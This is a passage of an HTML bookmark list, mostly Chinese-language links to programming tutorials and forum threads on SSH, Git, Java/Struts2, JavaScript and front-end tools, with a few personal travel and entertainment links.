rel=\"noopener\">http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC</a><br><a href=\"http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC\" target=\"_blank\" rel=\"noopener\">http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC</a></p>\n<p>安裝 CentOS 7 後必做的七件事 – 香港網頁開發網誌<br><a href=\"https://www.hkpug.net/2014/09/18/%E5%AE%89%E8%A3%9D-centos-7-%E5%BE%8C%E5%BF%85%E5%81%9A%E7%9A%84%E4%B8%83%E4%BB%B6%E4%BA%8B/\" target=\"_blank\" rel=\"noopener\">https://www.hkpug.net/2014/09/18/%E5%AE%89%E8%A3%9D-centos-7-%E5%BE%8C%E5%BF%85%E5%81%9A%E7%9A%84%E4%B8%83%E4%BB%B6%E4%BA%8B/</a></p>\n<p>github 报 sign_and_send_pubkey: signing failed: agent refused operation 错误解决-呆若-ChinaUnix 博客<br><a href=\"http://newsolider.blog.chinaunix.net/uid-21142030-id-5723937.html\" target=\"_blank\" rel=\"noopener\">http://newsolider.blog.chinaunix.net/uid-21142030-id-5723937.html</a></p>\n<p>程式扎記: [Linux 小學堂] SSH 免密碼登入<br><a href=\"http://puremonkey2010.blogspot.tw/2010/10/linux-ssh.html\" target=\"_blank\" rel=\"noopener\">http://puremonkey2010.blogspot.tw/2010/10/linux-ssh.html</a></p>\n<p>老宅筆記本: 給 windows 使用者的簡易 Git 環境架設<br><a href=\"https://eric0806.blogspot.com/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html\" target=\"_blank\" rel=\"noopener\">https://eric0806.blogspot.com/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html</a></p>\n<p><a href=\"https://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go\" target=\"_blank\" rel=\"noopener\">https://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go</a><br><a href=\"https://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go\" target=\"_blank\" rel=\"noopener\">https://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go</a></p>\n<p>wxpython - How can I create a simple message box in Python? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2963263/how-can-i-create-a-simple-message-box-in-python\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2963263/how-can-i-create-a-simple-message-box-in-python</a></p>\n<p>Alvin 的學習筆記 Log: Javascript 學習筆記－Javascript 的統計報表( Charts ) Library 收集<br><a href=\"http://alvinlee0327.blogspot.tw/2014/04/javascriptjavascriptlibrary.html\" target=\"_blank\" rel=\"noopener\">http://alvinlee0327.blogspot.tw/2014/04/javascriptjavascriptlibrary.html</a></p>\n<p><a href=\"http://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html\" target=\"_blank\" rel=\"noopener\">http://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html</a><br><a href=\"http://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html\" target=\"_blank\" rel=\"noopener\">http://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html</a></p>\n<p>Module 開發 - runwayShow<br><a href=\"https://www.facebook.com/notes/paul-li/module-%E9%96%8B%E7%99%BC-runwayshow/10154257159377211?qid=6328659570242092483&amp;mf_story_key=-5054522967479182062\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/notes/paul-li/module-%E9%96%8B%E7%99%BC-runwayshow/10154257159377211?qid=6328659570242092483&amp;mf_story_key=-5054522967479182062</a></p>\n<p>李四端的雲端世界 - YouTube<br><a href=\"https://www.youtube.com/user/newscloudworld\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/user/newscloudworld</a></p>\n<p>How Browser work - 瀏覽器運作原理 « YJ Blog<br><a href=\"http://sj82516-blog.logdown.com/posts/860934\" target=\"_blank\" rel=\"noopener\">http://sj82516-blog.logdown.com/posts/860934</a></p>\n<p>TechBridge 技術共筆部落格<br><a href=\"http://blog.techbridge.cc/\" target=\"_blank\" rel=\"noopener\">http://blog.techbridge.cc/</a></p>\n<p>Kuro’s Blog<br><a href=\"https://kuro.tw/\" target=\"_blank\" rel=\"noopener\">https://kuro.tw/</a></p>\n<p>Mr.typhoon<br><a href=\"https://quote-b781f.firebaseapp.com/\" target=\"_blank\" rel=\"noopener\">https://quote-b781f.firebaseapp.com/</a></p>\n<p>[SVN] TortoiseSVN 筆記 - 程式心得筆記 工程屍的日子 | Mr. 一顆痣 a.k.a. bigd<br><a href=\"http://iambigd.blogspot.com/2014/04/svn-tortoisesvn.html\" target=\"_blank\" rel=\"noopener\">http://iambigd.blogspot.com/2014/04/svn-tortoisesvn.html</a></p>\n<p>2016 台北雙年展<br><a href=\"http://www.taipeibiennial.org/2016/#Presentation\" target=\"_blank\" rel=\"noopener\">http://www.taipeibiennial.org/2016/#Presentation</a></p>\n<p>s:iterator within s:select (Struts forum at Coderanch)<br><a href=\"https://coderanch.com/t/444875/framework/iterator-select\" target=\"_blank\" rel=\"noopener\">https://coderanch.com/t/444875/framework/iterator-select</a></p>\n<p>Iterate through HashMap using Struts2 Iterator - TipsTrickz<br><a href=\"http://www.tipstrickz.com/iterate-through-hashmap-using-struts2-iterator/\" target=\"_blank\" rel=\"noopener\">http://www.tipstrickz.com/iterate-through-hashmap-using-struts2-iterator/</a></p>\n<p>java - Parsing ArrayList of Hashmap in Struts2 tag using s:iterator - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/29329355/parsing-arraylist-of-hashmap-in-struts2-tag-using-siterator\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/29329355/parsing-arraylist-of-hashmap-in-struts2-tag-using-siterator</a></p>\n<p>struts2 的&lt;s:select&gt;的用法 - ITeye 问答<br><a href=\"http://www.iteye.com/problems/93112\" target=\"_blank\" rel=\"noopener\">http://www.iteye.com/problems/93112</a></p>\n<p>struts2 中 s:select 标签的使用 - 莫理琴的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/moliqin/article/details/3753570\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/moliqin/article/details/3753570</a></p>\n<p>小信豬的原始部落: Java 學習筆記 (7) - Container<br><a href=\"http://godleon.blogspot.tw/2007/07/container-container-list-set-map-key.html\" target=\"_blank\" rel=\"noopener\">http://godleon.blogspot.tw/2007/07/container-container-list-set-map-key.html</a></p>\n<p>[JAVA]ArrayList @ 摳鼎人生 :: 痞客邦 PIXNET ::<br><a href=\"http://taurus770423.pixnet.net/blog/post/281155324-%5Bjava%5Darraylist\" target=\"_blank\" rel=\"noopener\">http://taurus770423.pixnet.net/blog/post/281155324-%5Bjava%5Darraylist</a></p>\n<p>JWorld@TW Java 論壇 - 討論各種 MAP SET LIST<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=5&amp;id=28127&amp;sty=1&amp;tpg=1&amp;age=-1\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=5&amp;id=28127&amp;sty=1&amp;tpg=1&amp;age=-1</a></p>\n<p>泛型進階語法 | Java SE 6 技術手冊<br><a href=\"https://caterpillar.gitbooks.io/javase6tutorial/content/c12_2.html\" target=\"_blank\" rel=\"noopener\">https://caterpillar.gitbooks.io/javase6tutorial/content/c12_2.html</a></p>\n<p>PHP 是否能輸出報表呢??<br><a href=\"http://phorum.study-area.org/index.php?topic=38934.0\" target=\"_blank\" rel=\"noopener\">http://phorum.study-area.org/index.php?topic=38934.0</a></p>\n<p>particles.js - A lightweight JavaScript library for creating particles<br><a href=\"http://vincentgarreau.com/particles.js/\" target=\"_blank\" rel=\"noopener\">http://vincentgarreau.com/particles.js/</a></p>\n<p>spin.js<br><a href=\"http://spin.js.org/#\" target=\"_blank\" rel=\"noopener\">http://spin.js.org/#</a>!</p>\n<p>蜜柑计划 - Mikan Project<br><a href=\"http://mikanani.me/\" target=\"_blank\" rel=\"noopener\">http://mikanani.me/</a></p>\n<p>ScrollMagic ♥ Demo<br><a href=\"http://scrollmagic.io/\" target=\"_blank\" rel=\"noopener\">http://scrollmagic.io/</a></p>\n<p>結構化資料 SEO 與 meta 標籤 - OXXO.STUDIO<br><a href=\"http://www.oxxostudio.tw/articles/201406/social-meta.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201406/social-meta.html</a></p>\n<p>Emmet CSS Snippets<br><a href=\"http://peiwen.lu/Emmet-Css-Snippets-for-Sublime-Text-2/\" target=\"_blank\" rel=\"noopener\">http://peiwen.lu/Emmet-Css-Snippets-for-Sublime-Text-2/</a></p>\n<p>Atom 使用心得與 Package 推薦 ( 2016/07/26 更新) « Negai no Sekai<br><a href=\"http://negaihoshi.logdown.com/posts/220517-atom-use-ideas-and-recommendations\" target=\"_blank\" rel=\"noopener\">http://negaihoshi.logdown.com/posts/220517-atom-use-ideas-and-recommendations</a></p>\n<p>Manning | Secrets of the JavaScript Ninja<br><a href=\"https://www.manning.com/books/secrets-of-the-javascript-ninja\" target=\"_blank\" rel=\"noopener\">https://www.manning.com/books/secrets-of-the-javascript-ninja</a></p>\n<p>Fevolution Innovation Inc.<br><a href=\"https://www.fevolution.com/#share-happiness\" target=\"_blank\" rel=\"noopener\">https://www.fevolution.com/#share-happiness</a></p>\n<p>取得視窗維度資訊<br><a href=\"https://openhome.cc/Gossip/JavaScript/WindowDimension.html\" target=\"_blank\" rel=\"noopener\">https://openhome.cc/Gossip/JavaScript/WindowDimension.html</a></p>\n<p>敏捷開發懶人包：物件導向技能 — 泰迪軟體<br><a href=\"http://teddysoft.tw/courses/agile-skill-ooad/\" target=\"_blank\" rel=\"noopener\">http://teddysoft.tw/courses/agile-skill-ooad/</a></p>\n<p>Is there any good dynamic SQL builder library in Java? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/5620985/is-there-any-good-dynamic-sql-builder-library-in-java\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/5620985/is-there-any-good-dynamic-sql-builder-library-in-java</a></p>\n<p>[ISUX 译转]CSS3 transition 规范的实际使用经验 - 前端技术 - 腾讯 ISUX<br><a href=\"https://isux.tencent.com/css3-transition.html\" target=\"_blank\" rel=\"noopener\">https://isux.tencent.com/css3-transition.html</a></p>\n<p>CSS3 transition 介绍 - 简书<br><a href=\"http://www.jianshu.com/p/56f8ddafc63f\" target=\"_blank\" rel=\"noopener\">http://www.jianshu.com/p/56f8ddafc63f</a></p>\n<p>更改 Eclipse 下 Tomcat 的部署目录 - Watson 的码步 - ITeye 技术网站<br><a href=\"http://kingxss.iteye.com/blog/1741438\" target=\"_blank\" rel=\"noopener\">http://kingxss.iteye.com/blog/1741438</a></p>\n<p>Using java.net.URLConnection to fire and handle HTTP requests - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2793150/using-java-net-urlconnection-to-fire-and-handle-http-requests/2793153#2793153\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2793150/using-java-net-urlconnection-to-fire-and-handle-http-requests/2793153#2793153</a></p>\n<p>java - ServletFileUpload#parseRequest(request) returns an empty list - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/13881272/servletfileuploadparserequestrequest-returns-an-empty-list\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/13881272/servletfileuploadparserequestrequest-returns-an-empty-list</a></p>\n<p>eclipse 中 server location 为灰色，不能修改 - wanwanwan123 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/wanwanwan123/article/details/7491445\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/wanwanwan123/article/details/7491445</a></p>\n<p>詳解 struts.multipart.saveDir 的臨時文件路徑 - xlgps.com<br><a href=\"http://www.xlgps.com/article/152545.html\" target=\"_blank\" rel=\"noopener\">http://www.xlgps.com/article/152545.html</a></p>\n<p>Unable to find ‘struts.multipart.saveDir’ Struts2 上传文件错误的解决方法 | IT 宅.com<br><a href=\"http://www.itzhai.com/unable-to-find-struts-multipart-savedir-struts2-upload-file-error-solution.html\" target=\"_blank\" rel=\"noopener\">http://www.itzhai.com/unable-to-find-struts-multipart-savedir-struts2-upload-file-error-solution.html</a></p>\n<p>史帝芬心得筆記: spring 4.x + struts 2.x + mybatis 3.x - getting started<br><a href=\"http://stevenitlife.blogspot.tw/2014/10/spring-4x-struts-2x-mybatis-3x.html\" target=\"_blank\" rel=\"noopener\">http://stevenitlife.blogspot.tw/2014/10/spring-4x-struts-2x-mybatis-3x.html</a></p>\n<p>servlet 使用二进制流传送请求参数，request.getPart(“”)取不到值-CSDN 论坛-CSDN.NET-中国最大的 IT 技术社区<br><a href=\"http://bbs.csdn.net/topics/390682830\" target=\"_blank\" rel=\"noopener\">http://bbs.csdn.net/topics/390682830</a></p>\n<p>SpringMVC 文件上傳接口設計與實現_人人 IT 網<br><a href=\"http://fanli7.net/a/bianchengyuyan/C__/20150302/538805.html\" target=\"_blank\" rel=\"noopener\">http://fanli7.net/a/bianchengyuyan/C__/20150302/538805.html</a></p>\n<p>【東京自由行】 - 02/02<font color=\"FA007A\"><b>自主玩</b></font>東京自由行 4 天(香草航空／1 人成行／早去晚回／不可延回) - 燦星旅遊<br><a href=\"http://www.startravel.com.tw/StarTravel.Web.IPKG/BBSingleProd.aspx?Prod_No=IPKG000009926&amp;Grp_No=TYO04JW20217A#a4\" target=\"_blank\" rel=\"noopener\">http://www.startravel.com.tw/StarTravel.Web.IPKG/BBSingleProd.aspx?Prod_No=IPKG000009926&amp;Grp_No=TYO04JW20217A#a4</a></p>\n<p>不安全的連線<br><a href=\"https://www.boca.gov.tw/ap?apName=applyDesc&amp;mp=1\" target=\"_blank\" rel=\"noopener\">https://www.boca.gov.tw/ap?apName=applyDesc&amp;mp=1</a></p>\n<p><a href=\"http://misscoding.blogspot.com/2012/05/git_22.html\" target=\"_blank\" rel=\"noopener\">http://misscoding.blogspot.com/2012/05/git_22.html</a><br><a href=\"http://misscoding.blogspot.com/2012/05/git_22.html\" target=\"_blank\" rel=\"noopener\">http://misscoding.blogspot.com/2012/05/git_22.html</a></p>\n<p>【Git】 隨手筆記 « 和平，奮鬥，救 WEB<br><a href=\"http://fireqqtw.logdown.com/posts/196392-git-casually-notes\" target=\"_blank\" rel=\"noopener\">http://fireqqtw.logdown.com/posts/196392-git-casually-notes</a></p>\n<p>Git 版本控制系統 | 還沒 push 前可以做的事<br><a href=\"https://ihower.tw/git/rebase.html\" target=\"_blank\" rel=\"noopener\">https://ihower.tw/git/rebase.html</a></p>\n<p>13 Essential PHP Interview Questions and Answers | Toptal<br><a href=\"https://www.toptal.com/php/interview-questions\" target=\"_blank\" rel=\"noopener\">https://www.toptal.com/php/interview-questions</a></p>\n<p>13 Essential PHP Interview Questions and Answers | Toptal<br><a href=\"https://www.toptal.com/php/interview-questions#iquestion_form\" target=\"_blank\" rel=\"noopener\">https://www.toptal.com/php/interview-questions#iquestion_form</a></p>\n<p>透過 JavaScript,Ruby,PHP,C# 語言，理解 Java 的 Lambda 語法 - 石頭閒語<br><a href=\"http://rocksaying.tw/archives/12742243.html\" target=\"_blank\" rel=\"noopener\">http://rocksaying.tw/archives/12742243.html</a></p>\n<p>深入理解什麼是 javascript 中的閉包。_StackDoc<br><a href=\"http://fanli7.net/a/caozuoxitong/OS/20110830/125313.html\" target=\"_blank\" rel=\"noopener\">http://fanli7.net/a/caozuoxitong/OS/20110830/125313.html</a></p>\n<p>Closure 閉包 - eddychang.me<br><a href=\"http://eddychang.me/blog/javascript/84-js-clousure.html\" target=\"_blank\" rel=\"noopener\">http://eddychang.me/blog/javascript/84-js-clousure.html</a></p>\n<p>從 ES6 開始的 JavaScript 學習生活 · GitBook<br><a href=\"https://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details</a></p>\n<p>Tag : javascript « 弱弱前端碎碎念<br><a href=\"http://heyyou.logdown.com/tags/javascript\" target=\"_blank\" rel=\"noopener\">http://heyyou.logdown.com/tags/javascript</a></p>\n<p>JavaScript 筆記: function is call by “value” or call by “reference”? « 弱弱前端碎碎念<br><a href=\"http://heyyou.logdown.com/posts/145054\" target=\"_blank\" rel=\"noopener\">http://heyyou.logdown.com/posts/145054</a></p>\n<p>Javascript 閉包 Closure « Guang’s Note<br><a href=\"http://guang.logdown.com/posts/277383-javascript-closure\" target=\"_blank\" rel=\"noopener\">http://guang.logdown.com/posts/277383-javascript-closure</a></p>\n<p>闭包 - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Performance_considerations\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Performance_considerations</a></p>\n<p>《你不知道的 JavaScript》整理（一）——作用域、提升與閉包 - 每日頭條<br><a href=\"https://kknews.cc/other/6bmzqq.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/other/6bmzqq.html</a></p>\n<p>首頁 - Myself 動漫 | 日本在線動畫﹑擁有多種視頻由你選擇﹑免費任您收看 - Powered by Discuz!<br><a href=\"http://myself-bbs.com/portal.php\" target=\"_blank\" rel=\"noopener\">http://myself-bbs.com/portal.php</a></p>\n<p>不允許存取<br><a href=\"https://www.blogger.com/blogin.g?blogspotURL=https://acgeternalstar.blogspot.tw/p/blog-page_50.html\" target=\"_blank\" rel=\"noopener\">https://www.blogger.com/blogin.g?blogspotURL=https://acgeternalstar.blogspot.tw/p/blog-page_50.html</a></p>\n<p><a href=\"https://www.inside.com.tw/2016/09/30/coding-is-over\" target=\"_blank\" rel=\"noopener\">https://www.inside.com.tw/2016/09/30/coding-is-over</a><br><a href=\"https://www.inside.com.tw/2016/09/30/coding-is-over\" target=\"_blank\" rel=\"noopener\">https://www.inside.com.tw/2016/09/30/coding-is-over</a></p>\n<p>ES6 语法实践，用 ES6 重写《JavaScript Patterns》中的设计模式 - CNode 技术社区<br><a href=\"https://cnodejs.org/topic/5565b4a77d4c64752effb5dd\" target=\"_blank\" rel=\"noopener\">https://cnodejs.org/topic/5565b4a77d4c64752effb5dd</a></p>\n<p>《JavaScript 设计模式》PDF 版本下载 - 小木人印象<br><a href=\"http://www.xwood.net/_site_domain_/_root/5870/5930/5932/t_c262754.html\" target=\"_blank\" rel=\"noopener\">http://www.xwood.net/_site_domain_/_root/5870/5930/5932/t_c262754.html</a></p>\n<p>頁面載入發生問題<br><a href=\"http://pan.baidu.com/s/1i5k2CjN\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1i5k2CjN</a></p>\n<p>Fire-and-Forget 前端轉貼總部<br><a href=\"https://www.facebook.com/groups/F2ETW.share.HQ/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/F2ETW.share.HQ/</a></p>\n<p>Startup Engineering 新創工程技術筆記<br><a href=\"http://blog.kdchang.cc/\" target=\"_blank\" rel=\"noopener\">http://blog.kdchang.cc/</a></p>\n<p>JavaScript 程式設計新手村 - Hahow 好學校<br><a href=\"https://hahow.in/courses/57d60701ed63880700da234c\" target=\"_blank\" rel=\"noopener\">https://hahow.in/courses/57d60701ed63880700da234c</a></p>\n<p>17JT202JWM 《保證出發》香草東京瑞江自由行 5 日(含稅/2 人成行) - 雄獅旅遊<br><a href=\"http://www.liontravel.com/webpd/webpdsh00.aspx?sProd=17JT202JWM\" target=\"_blank\" rel=\"noopener\">http://www.liontravel.com/webpd/webpdsh00.aspx?sProd=17JT202JWM</a></p>\n<p>《保證出發》香草東京瑞江自由行 5 日(含稅/2 人成行) - 雄獅旅遊<br><a href=\"http://www.liontravel.com/webpd/webpdsh00.aspx?sKind=1&amp;sProd=TPETYOJW06\" target=\"_blank\" rel=\"noopener\">http://www.liontravel.com/webpd/webpdsh00.aspx?sKind=1&amp;sProd=TPETYOJW06</a></p>\n<p>Web Scraping - Code Self Study Wiki<br><a href=\"http://codeselfstudy.com/wiki/Web_Scraping\" target=\"_blank\" rel=\"noopener\">http://codeselfstudy.com/wiki/Web_Scraping</a></p>\n<p>2017 最新！自己辦護照超簡單！第一次申請護照流程(去外交部地圖) - 喬伊斯洛伐克。任意門<br><a href=\"https://joyce8.com/apply-for-a-passport/\" target=\"_blank\" rel=\"noopener\">https://joyce8.com/apply-for-a-passport/</a></p>\n<p>簡介 · Git<br><a href=\"https://zlargon.gitbooks.io/git-tutorial/content/index.html\" target=\"_blank\" rel=\"noopener\">https://zlargon.gitbooks.io/git-tutorial/content/index.html</a></p>\n<p>玩 Wargame 學習 Linux 操作：Bandit (Level 0 - Level 19) « Have a Smile :))<br><a href=\"http://hvsimon-lin.logdown.com/posts/960664-wargame-linux-operation-bandit\" target=\"_blank\" rel=\"noopener\">http://hvsimon-lin.logdown.com/posts/960664-wargame-linux-operation-bandit</a></p>\n<p>Wargames hack - Google 搜尋<br><a href=\"https://www.google.com.tw/search?q=Wargames+hack&amp;oq=Wargames+hack&amp;gs_l=serp.3..0j0i10k1j0i30k1l4j0i5i30k1j0i8i30k1l3.1666.3466.0.3685.5.5.0.0.0.0.332.562.0j2j0j1.3.0....0...1c.1.64.serp.\" target=\"_blank\" rel=\"noopener\">https://www.google.com.tw/search?q=Wargames+hack&amp;oq=Wargames+hack&amp;gs_l=serp.3..0j0i10k1j0i30k1l4j0i5i30k1j0i8i30k1l3.1666.3466.0.3685.5.5.0.0.0.0.332.562.0j2j0j1.3.0....0...1c.1.64.serp.</a>.<br>2.3.559…0i10i30k1.B1eGJM7V58M<br>俠盜獵車手 5 (GTA 5) PC 版圖文攻略 | 娛樂計程車<br><a href=\"http://www.entertainment14.net/blog/post/110202884-%E4%BF%A0%E7%9B%9C%E7%8D%B5%E8%BB%8A%E6%89%8B-5-(gta-5)-pc%E7%89%88%E5%9C%96%E6%96%87%E6%94%BB%E7%95%A5\" target=\"_blank\" rel=\"noopener\">http://www.entertainment14.net/blog/post/110202884-%E4%BF%A0%E7%9B%9C%E7%8D%B5%E8%BB%8A%E6%89%8B-5-(gta-5)-pc%E7%89%88%E5%9C%96%E6%96%87%E6%94%BB%E7%95%A5</a></p>\n<p>Releases · GTACoop/GTACoop<br><a href=\"https://github.com/GTACoop/GTACoop/releases\" target=\"_blank\" rel=\"noopener\">https://github.com/GTACoop/GTACoop/releases</a></p>\n<p>【已漢化】【最新】gta5 盜版聯機 MOD 親測成功！沒有封殺！不是 FIVEM 和 GTA–MP！@GTA5 俠盜獵車手 5_夢遊電玩論壇 - APK 手機遊戲 Iphone 線上遊戲 網頁遊戲 APP 下載<br><a href=\"https://www.game735.com/thread-263631-1-1.html\" target=\"_blank\" rel=\"noopener\">https://www.game735.com/thread-263631-1-1.html</a></p>\n<p>FramerJS Club – Showcase of framerjs prototypes and cool articles<br><a href=\"http://framerjs.club/\" target=\"_blank\" rel=\"noopener\">http://framerjs.club/</a></p>\n<p>javascript 变量声明 及作用域 - silentjesse - 博客园<br><a href=\"http://www.cnblogs.com/silentjesse/p/4024536.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/silentjesse/p/4024536.html</a></p>\n<p>detailyang/awesome-cheatsheet: awesome cheatsheet<br><a href=\"https://github.com/detailyang/awesome-cheatsheet#front-end-development\" target=\"_blank\" rel=\"noopener\">https://github.com/detailyang/awesome-cheatsheet#front-end-development</a></p>\n<p>Increment 1,1,1,2,2,2,3,3,3 - Technical Support - Sublime Forum<br><a href=\"https://forum.sublimetext.com/t/increment-1-1-1-2-2-2-3-3-3/15347\" target=\"_blank\" rel=\"noopener\">https://forum.sublimetext.com/t/increment-1-1-1-2-2-2-3-3-3/15347</a></p>\n<p>Android 学习笔记：多个 AsyncTask 实例的并发问题 - 51kata - 博客园<br><a href=\"http://www.cnblogs.com/51kata/p/4122655.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/51kata/p/4122655.html</a></p>\n<p>【JSDC 客座文章】企業端如何推動持續整合開發流程 | iThome<br><a href=\"http://www.ithome.com.tw/guest-post/98457\" target=\"_blank\" rel=\"noopener\">http://www.ithome.com.tw/guest-post/98457</a></p>\n<p>图解 Git<br><a href=\"https://marklodato.github.io/visual-git-guide/index-zh-cn.html\" target=\"_blank\" rel=\"noopener\">https://marklodato.github.io/visual-git-guide/index-zh-cn.html</a></p>\n<p>Wallpapers by Makoto Shinkai - Wallpaper Abyss<br><a href=\"https://wall.alphacoders.com/unregistered.php?id=3657&amp;lang=Swedish\" target=\"_blank\" rel=\"noopener\">https://wall.alphacoders.com/unregistered.php?id=3657&amp;lang=Swedish</a></p>\n<p>Vue.js + Firebase 動手做 - HackMD<br><a href=\"https://hackmd.io/p/HJbgb47N#/\" target=\"_blank\" rel=\"noopener\">https://hackmd.io/p/HJbgb47N#/</a></p>\n<p>gulp 學習筆記 · GitBook<br><a href=\"https://www.gitbook.com/book/kejyuntw/gulp-learning-notes/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/kejyuntw/gulp-learning-notes/details</a></p>\n<p>Match URL patterns with RegEx<br><a href=\"https://regex.wtf/url-matching-regex-javascript/\" target=\"_blank\" rel=\"noopener\">https://regex.wtf/url-matching-regex-javascript/</a></p>\n<p>深入解析 CSS Flexbox - OXXO.STUDIO<br><a href=\"http://www.oxxostudio.tw/articles/201501/css-flexbox.html\" target=\"_blank\" rel=\"noopener\">http://www.oxxostudio.tw/articles/201501/css-flexbox.html</a></p>\n<p>11:15 - 12:00 R1:前端框架大亂鬥 之 我為什麼選擇 Vue.js 2.0 – hackfoldr<br><a href=\"http://hackfoldr.org/mopcon2016/https%253A%252F%252Fhackmd.io%252FEwNgHA7AxlwQtABgKYE5HwCwis%252BAjOAQ3gFZSJhkRoBmFAMyA%253D%253D%253D%253Fboth\" target=\"_blank\" rel=\"noopener\">http://hackfoldr.org/mopcon2016/https%253A%252F%252Fhackmd.io%252FEwNgHA7AxlwQtABgKYE5HwCwis%252BAjOAQ3gFZSJhkRoBmFAMyA%253D%253D%253D%253Fboth</a></p>\n<p>例外處理 · gulp 學習筆記<br><a href=\"https://kejyuntw.gitbooks.io/gulp-learning-notes/content/start/Start-Exception.html\" target=\"_blank\" rel=\"noopener\">https://kejyuntw.gitbooks.io/gulp-learning-notes/content/start/Start-Exception.html</a></p>\n<p>【gulp-notify】gulp 處理通知 · gulp 學習筆記<br><a href=\"https://kejyuntw.gitbooks.io/gulp-learning-notes/content/plguins/Tool/Plugins-Tool-gulp-notify.html\" target=\"_blank\" rel=\"noopener\">https://kejyuntw.gitbooks.io/gulp-learning-notes/content/plguins/Tool/Plugins-Tool-gulp-notify.html</a></p>\n<p>Test Corner 第四次聚會 | Flickr<br><a href=\"https://www.flickr.com/photos/testcorner/sets/72157669492632172\" target=\"_blank\" rel=\"noopener\">https://www.flickr.com/photos/testcorner/sets/72157669492632172</a></p>\n<p>js 中 undefined，null 和 typeof 运算符 - coodoing - 博客园<br><a href=\"http://www.cnblogs.com/ttltry-air/archive/2011/03/24/1993433.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/ttltry-air/archive/2011/03/24/1993433.html</a></p>\n<p>淺談類型判斷 in JavaScript - Aar0n Huang<br><a href=\"http://blog.buginception.com/blog/2013/01/30/type-checking-in-javascript/\" target=\"_blank\" rel=\"noopener\">http://blog.buginception.com/blog/2013/01/30/type-checking-in-javascript/</a></p>\n<p>ITseer - 資訊知識分享 | 程式技術討論: JavaScript true/false 傻傻分不清楚<br><a href=\"http://itseer.blogspot.com/2012/04/javascript-truefalse.html\" target=\"_blank\" rel=\"noopener\">http://itseer.blogspot.com/2012/04/javascript-truefalse.html</a></p>\n<p>玩者小菩: 寫 JavaScript 時的好習慣(Good Practices)<br><a href=\"http://lpc1234kimo.blogspot.com/2010/12/javascriptgood-practices.html\" target=\"_blank\" rel=\"noopener\">http://lpc1234kimo.blogspot.com/2010/12/javascriptgood-practices.html</a></p>\n<p>Javascript 的各種陷阱 | Moolog<br><a href=\"http://jkmoo.com/wordpress/63/javascript-%E7%9A%84%E5%90%84%E7%A8%AE%E9%99%B7%E9%98%B1/\" target=\"_blank\" rel=\"noopener\">http://jkmoo.com/wordpress/63/javascript-%E7%9A%84%E5%90%84%E7%A8%AE%E9%99%B7%E9%98%B1/</a></p>\n<p>移除巴哈姆特針對 adblock 做檢測的腳本<br><a href=\"https://gist.github.com/aerialis/faaf65a438cb68b61c24a33906b1ee7c\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/aerialis/faaf65a438cb68b61c24a33906b1ee7c</a></p>\n<p>JavaScript - Closure 與 Hoisting<br><a href=\"http://cythilya.blogspot.com/2015/05/javascript-patterns-closure-hoisting.html\" target=\"_blank\" rel=\"noopener\">http://cythilya.blogspot.com/2015/05/javascript-patterns-closure-hoisting.html</a></p>\n<p>负载均衡与集群之 nginx+tomcat+memcached - 星空的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/chaofanwei/article/details/12715187\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/chaofanwei/article/details/12715187</a></p>\n<p>高并发之 Memcached 实战 - CSDN 学院 - CSDN<br><a href=\"http://edu.csdn.net/course/detail/484\" target=\"_blank\" rel=\"noopener\">http://edu.csdn.net/course/detail/484</a></p>\n<p>nginx+tomcat+memcached 构建 session 共享集群 - 信风 - 51CTO 技术博客<br><a 